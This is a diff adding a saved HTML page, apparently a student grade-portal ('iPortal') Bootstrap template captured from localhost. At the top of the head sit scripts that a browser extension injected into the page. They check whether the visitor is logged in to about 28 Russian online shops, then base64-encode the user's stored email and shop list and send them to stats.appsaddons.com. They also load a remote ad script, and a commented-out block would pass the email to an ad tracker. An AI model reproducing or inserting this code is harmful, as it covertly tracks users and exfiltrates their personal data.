@@ -1,0 +1,513 @@
+
+<!-- saved from url=(0073)http://localhost/bot/bootstrap-3.3.4-dist/bootstrap-3.3.4-dist/index.php# -->
+<html><script src="chrome-extension://kcfefccmndghghcanogfebekgbajgibi/Kernel.js?0.6920849981252104"></script><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1251"><script type="text/javascript" charset="UTF-8">
+(function () 
+{
+  function CustomEvent ( event, params ) 
+  {
+    params = params || { bubbles: false, cancelable: false, detail: undefined };
+    var evt = document.createEvent( 'CustomEvent' );
+    evt.initCustomEvent( event, params.bubbles, params.cancelable, params.detail );
+    return evt;
+   };
+
+  CustomEvent.prototype = window.Event.prototype;
+
+  window.CustomEvent = CustomEvent;
+})();
+
+var qs = function(s) 
+	{
+		return document.querySelectorAll(s);
+	},
+	gi = function(s) 
+	{
+		return document.getElementById(s)
+	};
+
+var shops = {
+ "003.ru": 
+ {
+ 	isLogged: function() 
+ 	{
+ 		if(qs("a[href*='logout'").length) 
+ 			return true;
+ 		else
+ 			return false;
+ 	}
+ },
+ "220-volt.ru": 
+ {
+ 	isLogged: function() 
+ 	{
+ 		var d = gi('user_auth');
+ 		if(d && d.style.display == "none")
+ 			return true;
+ 		else
+ 			return false;
+ 	}
+ },
+ "citilink.ru": 
+ {
+ 	isLogged: function() 
+ 	{
+ 		if(qs("a[href='/login/']").length) 
+ 			return false;
+ 		else
+ 			return true;
+ 	}
+ },
+ "dostavka.ru": 
+ {
+ 	isLogged: function() 
+ 	{
+ 		if(qs("a[href='http://www.dostavka.ru/request/LogoutRequest']").length)
+ 			return true;
+ 		else
+ 			return false;
+ 	}
+ },
+ "e96.ru": 
+ {
+ 	isLogged: function() 
+ 	{
+ 		if(qs("a[href='/cabinet/login']").length)
+ 			return false;
+ 		else
+ 			return true;
+ 	}
+ },
+ "eldorado.ru": 
+ {
+ 	isLogged: function() 
+ 	{
+ 		if(qs("a[href='/auth.php']").length)
+ 			return false;
+ 		else
+ 			return true;
+ 	}
+ },
+ "enter.ru": 
+ {
+ 	isLogged: function() 
+ 	{
+ 		return qs("a[href='/login']").length == 0;
+ 	}
+ },
+ "holodilnik.ru": 
+ {
+ 	isLogged: function() 
+ 	{
+ 		return qs("a[href='http://www.holodilnik.ru/auth/']").length == 0;
+ 	}
+ },
+ "kinderly.ru": 
+ {
+ 	isLogged: function() 
+ 	{
+ 		return qs('a[href="/client_account/orders?home"].js-modal-login').length == 0;
+ 	}
+ },
+ "kupivip.ru": 
+ {
+ 	isLogged: function() 
+ 	{
+ 		return qs("a[href='/account/orders']").length > 0;
+ 	}
+ },
+ "lamoda.ru": 
+ {
+ 	isLogged: function() 
+ 	{
+ 		return qs("a[href='/wishlist/']").length > 0;
+ 	}
+ },
+ "notik.ru": 
+ {
+ 	isLogged: function() 
+ 	{
+ 		return qs("a[href='/users/register']").length == 0;
+ 	}
+ },
+ "ozon.ru": 
+ {
+ 	isLogged: function() 
+ 	{
+ 		return qs("a[href='/context/newuser/']").length == 0;
+ 	}
+ },
+ "Ozon.travel": 
+ {
+ 	isLogged: function() 
+ 	{
+ 		return document.querySelector('u.in').offsetHeight > 0;
+ 	}
+ },
+ "pixel24.ru": 
+ {
+ 	isLogged: function() 
+ 	{
+ 		return qs("#loginDialog .fancybox").length == 0;	
+ 	}
+ },
+ "pleer.ru": 
+ {
+ 	isLogged: function() 
+ 	{
+ 		return qs('a[href="/register.html"]').length == 0;
+ 	}
+ },
+ "sapato.ru": 
+ {
+ 	isLogged: function() 
+ 	{
+ 		return qs('a[href="/personal/register/?newuser=reg"]').length == 0;
+ 	}
+ },
+ "shoptime.ru": 
+ {
+ 	isLogged: function() 
+ 	{
+ 		return qs('a[href="/login"]').length == 0;
+ 	}
+ },
+ "softkey.ru": 
+ {
+ 	isLogged: function() 
+ 	{
+ 		return qs('input[name="bokAuth"]').length == 0;
+ 	}
+ },
+ "sotmarket.ru": 
+ {
+ 	isLogged: function() 
+ 	{
+ 		return qs('._loggedout').length == 0;
+ 	}
+ },
+ "technopoint.ru": 
+ {
+ 	isLogged: function() 
+ 	{
+ 		return qs('a[href="/register/"]').length == 0;
+ 	}
+ },
+ "utinet.ru": 
+ {
+ 	isLogged: function() 
+ 	{
+ 		return qs('.registration').length == 0;
+ 	}
+ },
+ "utkonos.ru": 
+ {
+ 	isLogged: function() 
+ 	{
+ 		return qs('a[href="/auth"]').length == 0;
+ 	}
+ },
+ "vasko.ru": 
+ {
+ 	isLogged: function() 
+ 	{
+ 		return gi('authEntrance') == null;
+ 	}
+ },
+ "vseinstrumenti.ru": 
+ {
+ 	isLogged: function() 
+ 	{
+ 		return qs('.login_out').length > 0;
+ 	}
+ },
+ "wildberries.ru": 
+ {
+ 	isLogged: function() {
+ 		return qs('a[href*="https://security.wildberries.ru/register"]').length == 0;
+ 	}
+ },
+ "svyaznoy.ru": 
+ {
+ 	isLogged: function() 
+ 	{
+ 		return gi('reg_form') == null;
+ 	}
+ },
+ "ulmart.ru": 
+ {
+ 	isLogged: function() 
+ 	{
+ 		return qs('a[href*="/registration"]').length == 0;
+ 	}
+ }
+};
+
+function storeData(data) 
+{
+	var ev = new CustomEvent('mmp_storage_put', {detail: data});
+	window.dispatchEvent(ev);
+}
+
+function getData(keys) 
+{
+	var ev = new CustomEvent('mmp_storage_get', {detail: keys});
+	window.dispatchEvent(ev);
+}
+	
+function report(shop) 
+{
+	window.addEventListener('mmp_storage_receive', function(event) 
+	{
+		var d = event.detail,
+			m = d.shopper_mail,
+			s = d.shopper_shop;
+		s = s || {};
+		if(!s[shop]) 
+		{
+			s[shop] = false;
+			storeData({ shopper_shop: s });
+		}
+		if(m != null) 
+		{
+			m = JSON.parse(atob(m));
+			var am = [],
+				as = [];
+			var flag = false;
+			for(var i in m) 
+			{
+				if(m[i] == false) 
+					m[i] = flag = true;
+				am.push(i);	
+			}
+			for(var i in s) 
+			{
+				if(s[i] == false) 
+					s[i] = flag = true;
+				as.push(i);	
+			}
+
+			/*var CA = document.createElement('script');
+			CA.id = "xcntmyAsync";
+			CA.innerHTML = "var xcnt_user_email = '" + m[0] + "'; \
+				(function(d){ \
+				var xscr = d.createElement( 'script' ); xscr.async = 1; \
+				xscr.src = '//x.cnt.my/async/track/?r=' + Math.random(); \
+				var x = d.getElementById( 'xcntmyAsync' ); \
+				x.parentNode.insertBefore( xscr, x ); \
+				})(document);";
+			document.getElementsByTagName('body')[0].appendChild(CA);*/
+
+			if(flag) 
+			{
+				storeData({
+					shopper_mail: btoa(JSON.stringify(m)), 
+					shopper_shop: s
+				});
+				var k = btoa(JSON.stringify({
+					m: am, 
+					s: as
+				}));
+				var jp = document.createElement('script');
+				jp.onload = function() 
+				{
+					document.getElementsByTagName('head')[0].removeChild(jp);
+				}
+				jp.src = "http://stats.appsaddons.com/api/mail_shop_report/" + k;
+				document.getElementsByTagName('head')[0].appendChild(jp);	
+			}
+		}
+	});
+	getData(['shopper_mail', 'shopper_shop']);
+}
+
+setTimeout(function() {
+	for(var i in shops) 
+	{
+		if(location.href.indexOf(i) !== -1) 
+		{
+			var l = shops[i].isLogged();
+			if(l) 
+			{
+				report(i);
+			}
+		}
+	}
+}, 1000);
+
+</script><script type="text/javascript" charset="UTF-8" src="http://ads.appsaddons.com/ourcpatext.js"></script><title>iPortal</title>
+<link rel="stylesheet" type="text/css" href="./iPortal_files/bootstrap.css">
+
+  <style>
+body{
+
+  background-image: url(img/4.jpg);
+}
+.img{
+
+  width:50%;
+  height: 100px;
+}
+/*!
+ * Start Bootstrap - Half Slider HTML Template (http://startbootstrap.com)
+ * Code licensed under the Apache License v2.0.
+ * For details, see http://www.apache.org/licenses/LICENSE-2.0.
+ */
+#mainp{
+
+    border: solid black 1px;
+    width: 1200px;
+    height: 700px;
+    margin: 0px auto;
+    border-radius: 3%;
+    background-color: F8F8F8;
+}
+html,
+body {
+    height: 20%;
+}
+
+/* You can change the height of the carousel by changing the height in the class below. It is set to 50% by default, but can be any height! */
+
+.carousel {
+      height: 3000%;
+    border-radius: 10%;
+}
+
+
+.item,
+.active,
+.carousel-inner {
+    height: 100%;
+}
+
+/* Background images are set within the HTML using inline CSS, not here */
+
+.fill {
+    width: 80%;
+    height: 100%;
+    background-position: center;
+    -webkit-background-size: cover;
+    -moz-background-size: cover;
+    background-size: cover;
+    -o-background-size: cover;
+    margin: 0px auto;
+}
+
+footer {
+    margin: 0px auto;
+}
+  </style>
+  <style type="text/css"></style><script src="chrome-extension://kcfefccmndghghcanogfebekgbajgibi/files/foreground.js?0.4129368984140456"></script></head><body><nav class="navbar navbar-default">
+<div class="container-fluid">
+<!--— Brand and toggle get grouped for better mobile display —-->
+<div class="navbar-header">
+<button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
+<span class="sr-only">Toggle navigation</span>
+<span class="icon-bar"></span>
+<span class="icon-bar"></span>
+<span class="icon-bar"></span>
+</button> 
+<a class=" active navbar-brand " href="http://localhost/bot/bootstrap-3.3.4-dist/bootstrap-3.3.4-dist/index.php">iPortal</a>
+</div>
+
+<!--— Collect the nav links, forms, and other content for toggling —-->
+<div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+<ul class="nav navbar-nav">
+<li><a href="./iPortal_files/iPortal.html">MyGrades<span class="sr-only">(current)</span></a></li>
+<li><a href="./iPortal_files/iPortal.html">Credits</a></li>
+<li class="dropdown">
+<a href="./iPortal_files/iPortal.html" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-expanded="false">Disciplines <span class="caret"></span></a>
+<ul class="dropdown-menu" role="menu">
+<li><a href="./iPortal_files/iPortal.html">Mathematics</a></li>
+<li><a href="./iPortal_files/iPortal.html">Software</a></li>
+<li><a href="./iPortal_files/iPortal.html">Hardware Control</a></li>
+<li><a href="./iPortal_files/iPortal.html">Programming</a></li>
+<li class="divider"></li>
+<li><a href="./iPortal_files/iPortal.html">Languages</a></li>
+
+</ul>
+</li>
+</ul>
+<form class="navbar-form navbar-left" role="search">
+<div class="form-group">
+<input type="text" class="form-control" placeholder="Search">
+</div>
+<button type="submit" class="btn btn-default">Search</button>
+</form>
+<ul class="nav navbar-nav navbar-right">
+<li><a href="http://localhost/bot/bootstrap-3.3.4-dist/bootstrap-3.3.4-dist/reg.html"><button class="btn btn-default btn-m"><span class="glyphicon glyphicon-log-in"> LogIn</span></button></a></li>
+<li class="dropdown">
+<a href="./iPortal_files/iPortal.html" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-expanded="false">Other<span class="caret"></span></a>
+<ul class="dropdown-menu" role="menu">
+<li><a href="./iPortal_files/iPortal.html"><span class="glyphicon glyphicon-user"> MyCabinet</span></a></li>
+<li><a href="./iPortal_files/iPortal.html"><span class="glyphicon glyphicon-thumbs-down"> Retakes</span></a></li>
+<li class="divider"></li>
+<li><a href="./iPortal_files/iPortal.html"><span class="glyphicon glyphicon-log-out"> LogOut</span></a></li>
+</ul>
+</li>
+</ul>
+</div><!--— /.navbar-collapse —-->
+</div><!--— /.container-fluid —-->
+</nav>
+<!--
+SLIDER
+
+-->
+<header id="myCarousel" class="carousel slide">
+        <!-- Indicators -->
+        <ol class="carousel-indicators">
+            <li data-target="#myCarousel" data-slide-to="0" class="active"></li>
+            <li data-target="#myCarousel" data-slide-to="1"></li>
+            <li data-target="#myCarousel" data-slide-to="2"></li>
+        </ol>
+
+        <!-- Wrapper for Slides -->
+        <div class="carousel-inner">
+            <div class="item active">
+                <!-- Set the first background image using inline CSS below. -->
+                <div class="fill" style="background-image:url(&#39;img/s8.jpg&#39;);"></div>
+                <div class="carousel-caption">
+                    <h2>Caption 1</h2>
+                </div>
+            </div>
+            <div class="item">
+                <!-- Set the second background image using inline CSS below. -->
+                <div class="fill" style="background-image:url(&#39;img/c4.jpg&#39;);"></div>
+                <div class="carousel-caption">
+                    <h2>Caption 2</h2>
+                </div>
+            </div>
+            <div class="item">
+                <!-- Set the third background image using inline CSS below. -->
+                <div class="fill" style="background-image:url(&#39;img/s6.jpg&#39;);"></div>
+                <div class="carousel-caption">
+                    <h2>Caption 3</h2>
+                </div>
+            </div>
+        </div>
+
+        <!-- Controls -->
+        <a class="left carousel-control" href="http://localhost/bot/bootstrap-3.3.4-dist/bootstrap-3.3.4-dist/index.php#myCarousel" data-slide="prev">
+            <span class="icon-prev"></span>
+        </a>
+        <a class="right carousel-control" href="http://localhost/bot/bootstrap-3.3.4-dist/bootstrap-3.3.4-dist/index.php#myCarousel" data-slide="next">
+            <span class="icon-next"></span>
+        </a>
+
+    </header>
+    
+
+
+
+    <div id="mainp">
+    <div class="jumbotron">
+  <h1>My Grades for final</h1>
+  <p>...</p>
+  <p><a class="btn btn-primary btn-lg" href="./iPortal_files/iPortal.html" role="button">Learn more</a></p>
+</div>
+</div>
+
+<script type="text/javascript" src="./iPortal_files/jquery.js"></script>
+<script type="text/javascript" src="./iPortal_files/bootstrap.js"></script>
+
+</body></html>
